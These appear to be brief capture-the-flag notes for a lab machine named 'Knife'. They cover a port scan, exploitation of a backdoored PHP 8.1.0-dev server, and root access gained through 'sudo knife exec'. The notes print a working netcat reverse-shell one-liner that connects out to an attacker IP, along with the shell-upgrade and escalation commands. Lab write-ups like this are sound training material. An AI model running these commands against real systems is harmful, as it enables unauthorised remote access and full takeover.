# Knife

## Scanning 

`sudo nmap -sC -sV -oN nmap/initial `


### Open ports

```
22
80
```

## Users

```
james
```

## Endpoints


## Vuln

* Server uses php8.1.0-dev [https://www.exploit-db.com/exploits/49933]
* Got shell with exploit and got to user `james`
* revshell using `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.190 1234 >/tmp/f` [in client box], `nc -l -p 1234` [in my box]
* update to interactive shell using `python3 -c 'import pty; pty.spawn("/bin/bash");'` [in client box], then Ctrl + Z , `stty raw -echo` and `fg` then in the client machine `export TERM=xterm`

* doing `sudo -l` we can run `knife binary` with sudo privileges, so doing `sudo knife exec -E 'exec "/bin/sh"'` got root